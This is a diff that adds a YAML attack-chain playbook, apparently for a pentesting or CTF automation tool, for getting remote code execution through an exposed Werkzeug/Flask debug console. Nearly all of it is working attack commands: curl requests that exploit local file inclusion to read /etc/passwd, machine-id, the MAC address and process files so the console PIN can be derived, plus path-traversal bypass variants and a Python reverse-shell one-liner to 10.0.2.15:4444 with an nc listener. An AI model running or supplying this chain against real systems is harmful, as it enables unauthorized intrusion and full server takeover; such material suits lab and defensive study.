@@ -1,0 +1,97 @@
+chain_id: werkzeug_debug_pin_rce
+title: "Werkzeug/Flask debug console PIN to RCE"
+severity: CRITICAL
+tags: [web, werkzeug, flask, lfi, rce, debug-console]
+
+trigger:
+  any_of:
+    - product_pattern: "(?i)werkzeug"
+    - banner_pattern: "(?i)werkzeug"
+
+description: |
+  Applies when nmap detects 'Werkzeug httpd' (Flask's default WSGI server) on a
+  non-standard port (8080, 5000...). These applications sometimes leave /console
+  accessible: an interactive Python console gated by a PIN. If an endpoint also
+  exposes a Local File Inclusion (LFI), you can read the application source,
+  derive the PIN, and obtain RCE.
+
+steps:
+  - id: 1
+    title: "If nmap revealed a domain, add it to /etc/hosts"
+    command: |
+      echo "$VICTIMA dominio.thl" | sudo tee -a /etc/hosts
+    notes: |
+      Example nmap output that hints at this:
+      'http-title: Did not follow redirect to http://watchstore.thl:8080/'.
+
+  - id: 2
+    title: "Enumerate web server directories"
+    command: |
+      gobuster dir -u http://dominio.thl:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x py,html,txt
+    notes: |
+      Look in particular for /console (Werkzeug console), /read, /admin, /debug,
+      /api. An endpoint returning 'Status: 500' usually means an exploitable
+      error.
+
+  - id: 3
+    title: "Open /console in the browser"
+    notes: |
+      If you see 'The console is locked and needs to be unlocked by entering the
+      PIN', the console exists but requires a PIN. The server prints it on
+      startup; you have to read the source code and compute it.
+
+  - id: 4
+    title: "Probe parameters to detect LFI"
+    command: |
+      curl 'http://dominio.thl:8080/read'
+      curl 'http://dominio.thl:8080/read?id=/etc/passwd'
+      curl 'http://dominio.thl:8080/read?id=/etc/hostname'
+    notes: |
+      If the response says 'missing parameter id' (or similar), append it as a
+      query parameter as shown.
+
+  - id: 5
+    title: "Read the application source code"
+    command: |
+      curl 'http://dominio.thl:8080/read?id=/home/USUARIO/app/app.py'
+    notes: |
+      The error trace from step 4 usually leaks the exact path. In the source,
+      look for: SECRET_KEY, imported modules, and the 'app.run(...)' line.
+
+  - id: 6
+    title: "Compute the Werkzeug console PIN"
+    command: |
+      curl 'http://dominio.thl:8080/read?id=/etc/machine-id'
+      curl 'http://dominio.thl:8080/read?id=/sys/class/net/eth0/address'
+      curl 'http://dominio.thl:8080/read?id=/proc/self/cgroup'
+    notes: |
+      The PIN is derived deterministically from: username, modname (always
+      'flask.app'), appname ('Flask'), moddir (path to the entry file),
+      machine-id, MAC UUID. Pull all of those via LFI. A public script,
+      werkzeug_debug_console_pin.py, automates the calculation. See also
+      https://github.com/its-arun/Werkzeug-Debug-RCE.
+
+  - id: 7
+    title: "Get a reverse shell from the console"
+    command: |
+      nc -lvnp 4444
+    notes: |
+      Then in /console paste this Python and hit Enter:
+      import socket,os,pty;s=socket.socket();s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
+
+common_errors:
+  - error: "The console asks for a PIN and you do not have it"
+    solution: |
+      Compute it via LFI. If that fails, search for the PIN directly in
+      accessible logs:
+        curl 'http://dominio.thl:8080/read?id=/proc/self/fd/1'
+        curl 'http://dominio.thl:8080/read?id=/var/log/syslog'
+  - error: "LFI blocks absolute paths"
+    solution: |
+      Try relative path traversal or double-encoded variants:
+        curl 'http://dominio.thl:8080/read?id=../../etc/passwd'
+        curl 'http://dominio.thl:8080/read?id=....//....//etc/passwd'
+
+references:
+  - https://github.com/its-arun/Werkzeug-Debug-RCE
+  - https://werkzeug.palletsprojects.com/en/latest/debug/
